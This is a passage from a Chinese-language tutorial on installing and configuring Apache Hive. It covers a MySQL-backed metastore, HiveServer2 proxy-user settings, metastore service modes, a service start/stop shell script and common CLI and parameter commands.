--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionURL<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- jdbc:mysql://hadoop102:3306/metastore?useSSL=false&amp;amp;useUnicode=true&amp;amp;characterEncoding=UTF-8 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>jdbc:mysql://hadoop102:3306/metastore?useSSL=false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- jdbc连接的Driver--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionDriverName<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">&lt;!-- jdbc连接的username--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionUserName<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>root<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- jdbc连接的password --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionPassword<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Hive默认在HDFS的工作目录 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.warehouse.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>/user/hive/warehouse<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 下面可以选择不填 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 关闭元数据校验 --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.schema.verification<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.event.db.notification.api.auth<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 一些打印信息 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.cli.print.header<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.cli.print.current.db<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化Hive元数据库（修改为采用MySQL存储元数据）</span></span><br><span class="line">bin/schematool -dbType mysql -initSchema -verbose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Hive</span></span><br><span class="line">bin/hive</span><br><span class="line">hive&gt; show databases;</span><br><span class="line">hive&gt; show tables;</span><br><span class="line">hive&gt; create table stu(id int, name string);</span><br><span class="line">hive&gt; insert into stu values(1,<span class="string">"ss"</span>);</span><br><span class="line">hive&gt; select * from stu;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 看MySQL中的元数据</span></span><br><span class="line">mysql -uroot -p123456</span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">mysql&gt; use metastore;</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line"><span class="comment"># 查看元数据库中存储的库信息</span></span><br><span class="line">select * from DBS;</span><br><span class="line"><span class="comment"># 查看元数据库中存储的表信息</span></span><br><span class="line">select * from TBLS;</span><br><span class="line"><span class="comment"># 查看元数据库中存储的表中列相关信息</span></span><br><span class="line">select * from COLUMNS_V2;</span><br></pre></td></tr></table></figure><h3 id="2-5-Hive服务部署">2.5 Hive服务部署</h3><blockquote><p>Hive的hiveserver2服务的作用是提供jdbc/odbc接口，为用户提供远程访问Hive数据的功能，例如用户期望在个人电脑中访问远程服务中的Hive数据，就需要用到Hiveserver2</p></blockquote><p>在远程访问Hive数据时，客户端并未直接访问Hadoop集群，而是由Hivesever2代理访问。由于Hadoop集群中的数据具备访问权限控制，所以此时需考虑一个问题：那就是访问Hadoop集群的用户身份是谁？是Hiveserver2的启动用户？还是客户端的登录用户？</p><p>答案是都有可能，具体是谁，由Hiveserver2的<code>hive.server2.enable.doAs</code>参数决定，该参数的含义是是<strong>否启用Hiveserver2用户模拟的功能</strong>。若启用，则Hiveserver2会模拟成客户端的登录用户去访问Hadoop集群的数据，不启用，则Hivesever2会直接使用启动用户访问Hadoop集群数据。<strong>模拟用户的功能，默认是开启的</strong>。生产环境，推荐开启用户模拟功能，因为开启后才能保证各用户之间的权限隔离</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hivesever2的模拟用户功能，依赖于Hadoop提供的proxy user（代理用户功能），只有Hadoop中的代理用户才能模拟其他用户的身份访问Hadoop集群。</span></span><br><span class="line"><span class="comment"># 因此，需要将hiveserver2的启动用户设置为Hadoop的代理用户</span></span><br><span class="line"><span class="comment"># 修改配置文件core-site.xml，然后记得分发三台机器</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$HADOOP_HOME</span>/etc/hadoop</span><br><span class="line">vim core-site.xml</span><br><span class="line"><span class="comment"># 增加配置</span></span><br><span class="line">&lt;!--配置所有节点的atguigu用户都可作为代理用户--&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;hadoop.proxyuser.atguigu.hosts&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;*&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--配置atguigu用户能够代理的用户组为任意组--&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;hadoop.proxyuser.atguigu.groups&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;*&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--配置atguigu用户能够代理的用户为任意用户--&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;hadoop.proxyuser.atguigu.users&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;*&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"><span class="comment"># 分发</span></span><br><span class="line">xsync core-site.xml</span><br><span class="line"><span class="comment"># 重启hadoop</span></span><br><span class="line">myhadoop.sh stop/start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hive端配置</span></span><br><span class="line"><span class="comment"># 在hive-site.xml文件中添加如下配置信息，在conf目录下</span></span><br><span class="line">vim hive-site.xml</span><br><span class="line">&lt;!-- 指定hiveserver2连接的host --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;hive.server2.thrift.bind.host&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;hadoop102&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 指定hiveserver2连接的端口号 --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;hive.server2.thrift.port&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;10000&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动hiveserver2</span></span><br><span class="line">bin/hive --service hiveserver2</span><br><span class="line">nohup bin/hive --service hiveserver2 &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="comment"># 使用命令行客户端beeline进行远程访问</span></span><br><span class="line">./bin/beeline</span><br><span class="line">bin/beeline -u jdbc:hive2://hadoop102:10000 -n atguigu</span><br><span class="line"><span class="comment"># 另一种使用Datagrip图形化客户端进行远程访问</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 若datagrip查询发现列的元数据信息不显示，需要在hive-site.xml添加以下配置</span></span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;metastore.storage.schema.reader.impl&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;org.apache.hadoop.hive.metastore.SerDeStorageSchemaReader&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>接下来进行<strong>metastore部署</strong></p><p>Hive的metastore服务的作用是为Hive CLI或者Hiveserver2提供元数据访问接口，metastore有两种运行模式，分别为<strong>嵌入式模式(之前默认就是嵌入式启动)和独立服务模式</strong>。</p><p>生产环境中，不推荐使用嵌入式模式。因为其存在以下两个问题：嵌入式模式下，每个Hive CLI都需要直接连接元数据库，当Hive CLI较多时，数据库压力会比较大；每个客户端都需要用户元数据库的读写权限，元数据库的安全得不到很好的保证。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ==========================嵌入式模式=======================</span></span><br><span class="line"><span class="comment"># 嵌入式模式下，只需保证Hiveserver2和每个Hive CLI的配置文件hive-site.xml中包含连接元数据库所需要的以下参数即可</span></span><br><span class="line">&lt;!-- jdbc连接的URL --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;jdbc:mysql://hadoop102:3306/metastore?useSSL=<span class="literal">false</span>&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- jdbc连接的Driver--&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;javax.jdo.option.ConnectionDriverName&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- jdbc连接的username--&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;javax.jdo.option.ConnectionUserName&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;root&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- jdbc连接的password(选) --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;javax.jdo.option.ConnectionPassword&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;123456&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================独立服务模式=========================</span></span><br><span class="line">scp -r /opt/module/hive/ hadoop103:/opt/module/</span><br><span class="line"><span class="comment"># 然后在hadoop102启动metastore服务</span></span><br><span class="line">nohup hive --service metastore &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">jps -ml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后来到103节点，配置参数，即使配置了嵌入式的，也是访问这个，没有就报错</span></span><br><span class="line">&lt;!-- 指定metastore服务的地址 --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;hive.metastore.uris&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;thrift://hadoop102:9083&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"><span class="comment"># 注意：主机名需要改为metastore服务所在节点，端口号无需修改，metastore服务的默认端口就是9083</span></span><br><span class="line"><span class="comment"># 测试，发现可以正常访问</span></span><br><span class="line">bin/hive</span><br></pre></td></tr></table></figure><h3 id="2-6-Hive服务启动脚本-了解">2.6 Hive服务启动脚本(了解)</h3><ul><li>nohup：放在命令开头，表示不挂起，也就是关闭终端进程也继续保持运行状态</li><li>/dev/null：是Linux文件系统中的一个文件，被称为黑洞，所有写入该文件的内容都会被自动丢弃</li><li>2&gt;&amp;1：表示将错误重定向到标准输出上</li><li>&amp;：放在命令结尾，表示后台运行</li></ul><p>一般会组合使用：nohup  [xxx命令操作]&gt; file  2&gt;&amp;1 &amp;，表示将xxx命令运行的结果输出到file中，并保持命令启动的进程在后台运行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接编写脚本来管理服务的启动和关闭</span></span><br><span class="line">vim <span class="variable">$HIVE_HOME</span>/bin/hiveservices.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">HIVE_LOG_DIR=<span class="variable">$HIVE_HOME</span>/logs</span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="variable">$HIVE_LOG_DIR</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  mkdir -p <span class="variable">$HIVE_LOG_DIR</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#检查进程是否运行正常，参数1为进程名，参数2为进程端口</span></span><br><span class="line"><span class="keyword">function</span> check_process()</span><br><span class="line">&#123;</span><br><span class="line">    pid=$(ps -ef 2&gt;/dev/null | grep -v grep | grep -i <span class="variable">$1</span> | awk <span class="string">'&#123;print $2&#125;'</span>)</span><br><span class="line">    ppid=$(netstat -nltp 2&gt;/dev/null | grep <span class="variable">$2</span> | awk <span class="string">'&#123;print $7&#125;'</span> | cut -d <span class="string">'/'</span> -f 1)</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$pid</span></span><br><span class="line">    [[ <span class="string">"<span class="variable">$pid</span>"</span> =~ <span class="string">"<span class="variable">$ppid</span>"</span> ]] &amp;&amp; [ <span class="string">"<span class="variable">$ppid</span>"</span> ] &amp;&amp; <span class="built_in">return</span> 0 || <span class="built_in">return</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> hive_start()</span><br><span class="line">&#123;</span><br><span class="line">    metapid=$(check_process HiveMetastore 9083)</span><br><span class="line">    cmd=<span class="string">"nohup hive --service metastore &gt;<span class="variable">$HIVE_LOG_DIR</span>/metastore.log 2&gt;&amp;1 &amp;"</span></span><br><span class="line">    [ -z <span class="string">"<span class="variable">$metapid</span>"</span> ] &amp;&amp; <span class="built_in">eval</span> <span class="variable">$cmd</span> || <span class="built_in">echo</span> <span class="string">"Metastroe服务已启动"</span></span><br><span class="line">    server2pid=$(check_process HiveServer2 10000)</span><br><span class="line">    cmd=<span class="string">"nohup hive --service hiveserver2 &gt;<span class="variable">$HIVE_LOG_DIR</span>/hiveServer2.log 2&gt;&amp;1 &amp;"</span></span><br><span class="line">    [ -z <span class="string">"<span class="variable">$server2pid</span>"</span> ] &amp;&amp; <span class="built_in">eval</span> <span class="variable">$cmd</span> || <span class="built_in">echo</span> <span class="string">"HiveServer2服务已启动"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> hive_stop()</span><br><span class="line">&#123;</span><br><span class="line">metapid=$(check_process HiveMetastore 9083)</span><br><span class="line">    [ <span class="string">"<span class="variable">$metapid</span>"</span> ] &amp;&amp; <span class="built_in">kill</span> <span class="variable">$metapid</span> || <span class="built_in">echo</span> <span class="string">"Metastore服务未启动"</span></span><br><span class="line">    server2pid=$(check_process HiveServer2 10000)</span><br><span class="line">    [ <span class="string">"<span class="variable">$server2pid</span>"</span> ] &amp;&amp; <span class="built_in">kill</span> <span class="variable">$server2pid</span> || <span class="built_in">echo</span> <span class="string">"HiveServer2服务未启动"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line"><span class="string">"start"</span>)</span><br><span class="line">    hive_start</span><br><span class="line">    ;;</span><br><span class="line"><span class="string">"stop"</span>)</span><br><span class="line">    hive_stop</span><br><span class="line">    ;;</span><br><span class="line"><span class="string">"restart"</span>)</span><br><span class="line">    hive_stop</span><br><span class="line">    sleep 2</span><br><span class="line">    hive_start</span><br><span class="line">    ;;</span><br><span class="line"><span class="string">"status"</span>)</span><br><span class="line">    check_process HiveMetastore 9083 &gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">"Metastore服务运行正常"</span> || <span class="built_in">echo</span> <span class="string">"Metastore服务运行异常"</span></span><br><span class="line">    check_process HiveServer2 10000 &gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">"HiveServer2服务运行正常"</span> || <span class="built_in">echo</span> <span class="string">"HiveServer2服务运行异常"</span></span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    <span class="built_in">echo</span> Invalid Args!</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'Usage: '</span>$(basename <span class="variable">$0</span>)<span class="string">' start|stop|restart|status'</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加执行权限</span></span><br><span class="line">chmod +x <span class="variable">$HIVE_HOME</span>/bin/hiveservices.sh</span><br><span class="line"><span class="comment"># 启动Hive后台服务</span></span><br><span class="line">hiveservices.sh start</span><br></pre></td></tr></table></figure><h2 id="3、Hive使用技巧">3、Hive使用技巧</h2><h3 id="3-1-Hive常用交互命令">3.1 Hive常用交互命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">hive -<span class="built_in">help</span></span><br><span class="line"><span class="comment"># “-e”不进入hive的交互窗口执行hql语句</span></span><br><span class="line">hive -e <span class="string">"select id from stu;"</span></span><br><span class="line"><span class="comment"># “-f”执行脚本中的hql语句</span></span><br><span class="line"><span class="comment"># 在/opt/module/hive/下创建datas目录并在datas目录下创建hivef.sql文件</span></span><br><span class="line">mkdir datas</span><br><span class="line">vim hivef.sql</span><br><span class="line"><span class="comment"># 文件中写入正确的hql语句</span></span><br><span class="line">select * from stu;</span><br><span class="line">bin/hive -f /opt/module/hive/datas/hivef.sql</span><br><span class="line"><span class="comment"># 执行文件中的hql语句并将结果写入文件中</span></span><br><span class="line">bin/hive -f /opt/module/hive/datas/hivef.sql  &gt; /opt/module/hive/datas/hive_result.txt</span><br></pre></td></tr></table></figure><h3 id="3-2-Hive参数配置方式">3.2 Hive参数配置方式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前所有的配置信息</span></span><br><span class="line">hive&gt;<span class="built_in">set</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数的配置三种方式</span></span><br><span class="line"><span class="comment"># 1、默认配置文件：hive-default.xml</span></span><br><span class="line"><span class="comment"># 用户自定义配置文件：hive-site.xml</span></span><br><span class="line"><span class="comment"># 注意：用户自定义配置会覆盖默认配置。另外，Hive也会读入Hadoop的配置，因为Hive是作为Hadoop的客户端启动的，Hive的配置会覆盖Hadoop的配置。配置文件的设定对本机启动的所有Hive进程都有效</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、命令行参数方式</span></span><br><span class="line"><span class="comment"># 启动Hive时，可以在命令行添加-hiveconf param=value来设定参数</span></span><br><span class="line"><span class="comment"># 注意：仅对本次Hive启动有效</span></span><br><span class="line">bin/hive -hiveconf mapreduce.job.reduces=10;</span><br><span class="line"><span class="comment"># 查看参数设置</span></span><br><span class="line">hive (default)&gt; <span class="built_in">set</span> mapreduce.job.reduces;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、参数声明方式</span></span><br><span class="line"><span class="comment"># 以在HQL中使用SET关键字设定参数，例如</span></span><br><span class="line">hive(default)&gt; <span class="built_in">set</span> mapreduce.job.reduces;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上述三种设定方式的优先级依次递增。即配置文件 &lt; 命令行参数 &lt; 参数声明。</span></span><br><span class="line"><span class="comment"># 注意某些系统级的参数，例如log4j相关的设定，必须用前两种方式设定，因为那些参数的读取在会话建立以前已经完成了</span></span><br></pre></td></tr></table></figure><h3 id="3-3-Hive常见属性配置">3.3 Hive常见属性配置</h3><p>Hive客户端显示当前库和表头，<code>vim hive-site.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.cli.print.header<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Whether to print the names of the columns in query output.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.cli.print.current.db<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Whether to include the current database in the Hive prompt.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Hive运行日志路径配置</strong>，Hive的log默认存放在<code>/tmp/atguigu/hive.log</code>目录下（当前用户名下），修改Hive的log存放日志到<code>/opt/module/hive/logs</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改$HIVE_HOME/conf/hive-log4j2.properties.template文件名称为hive-log4j2.properties</span></span><br><span class="line">mv hive-log4j2.properties.template hive-log4j2.properties</span><br><span class="line"><span class="comment"># 在hive-log4j2.properties文件中修改log存放位置</span></span><br><span 